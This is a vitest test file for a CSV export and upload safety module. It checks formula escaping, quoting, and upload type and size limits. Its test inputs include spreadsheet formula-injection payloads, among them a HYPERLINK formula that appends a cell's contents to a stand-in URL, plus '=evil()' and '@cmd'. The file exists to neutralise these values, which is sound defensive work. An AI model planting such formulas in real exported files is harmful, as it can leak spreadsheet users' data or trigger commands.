import { describe, expect, it } from 'vitest'
import { checkCsvFile, checkCsvShape, csvCell, looksBinary, toSafeCsv } from './csvSafe'
import { toCsv } from './format'

describe('csvCell', () => {
  it('neutralises cells a spreadsheet would run as a formula', () => {
    expect(csvCell('=1+1')).toBe("'=1+1")
    expect(csvCell('+A1')).toBe("'+A1")
    expect(csvCell('-2+3')).toBe("'-2+3")
    expect(csvCell('@SUM(A1:A2)')).toBe("'@SUM(A1:A2)")
    expect(csvCell('\tcmd')).toBe("'\tcmd")
    expect(csvCell('\rcmd')).toBe(`"'\rcmd"`)
    expect(csvCell('=HYPERLINK("http://x/?"&A1,"click")')).toBe(`"'=HYPERLINK(""http://x/?""&A1,""click"")"`)
  })

  it('leaves numbers as numbers, negatives included', () => {
    expect(csvCell(-5)).toBe('-5')
    expect(csvCell(656)).toBe('656')
    expect(csvCell(7872.5)).toBe('7872.5')
    expect(csvCell('-12.50')).toBe('-12.50')
    expect(csvCell('+3')).toBe('+3')
    expect(csvCell('-1,234.00')).toBe('"-1,234.00"')
    expect(csvCell(Number.NaN)).toBe('')
  })

  it('quotes commas, quotes, CR and LF', () => {
    expect(csvCell('a,b')).toBe('"a,b"')
    expect(csvCell('say "hi"')).toBe('"say ""hi"""')
    expect(csvCell('a\rb')).toBe('"a\rb"')
    expect(csvCell('a\nb')).toBe('"a\nb"')
    expect(csvCell('plain text')).toBe('plain text')
    expect(csvCell(null)).toBe('')
    expect(csvCell(undefined)).toBe('')
    expect(csvCell(true)).toBe('true')
  })
})

describe('toSafeCsv', () => {
  it('writes a header and one line per row', () => {
    expect(toSafeCsv([{ client: '=evil()', value: -5 }, { client: 'Harbour, Dental', value: 656 }])).toBe("client,value\n'=evil(),-5\n\"Harbour, Dental\",656")
    expect(toSafeCsv([])).toBe('')
  })

  it('is what format.toCsv uses, so every export is covered', () => {
    const rows = [{ subject: '@cmd', minutes: 30 }]
    expect(toCsv(rows)).toBe(toSafeCsv(rows))
  })
})

describe('upload checks', () => {
  const file = (body: BlobPart, name: string, type = '') => new File([body], name, { type })

  it('refuses spreadsheets, binaries, empty and oversized files', async () => {
    expect(await checkCsvFile(file('a,b\n1,2', 'x.xlsx'))).toMatch(/Excel files/)
    expect(await checkCsvFile(file('%PDF-1.7', 'x.pdf', 'application/pdf'))).toMatch(/doesn't look like a CSV/)
    expect(await checkCsvFile(file(new Uint8Array([0x50, 0x4b, 0x03, 0x04, 0x00]), 'x.csv'))).toMatch(/doesn't look like a CSV/)
    expect(await checkCsvFile(file('', 'x.csv'))).toBe('This file is empty.')
    expect(await checkCsvFile(file('a,b\n1,2', 'x.csv'))).toBeNull()
  })

  it('limits columns and rows', () => {
    expect(checkCsvShape(['a', 'b'], 10)).toBeNull()
    expect(checkCsvShape(Array.from({ length: 201 }, (_, i) => `c${i}`), 1)).toMatch(/201 columns/)
    expect(checkCsvShape(['a'], 100_001)).toMatch(/more than 100,000 rows/)
  })

  it('treats UTF-8 text as text', () => {
    expect(looksBinary(new TextEncoder().encode('Client,Fee\nHarbour,£82\n'))).toBe(false)
  })
})
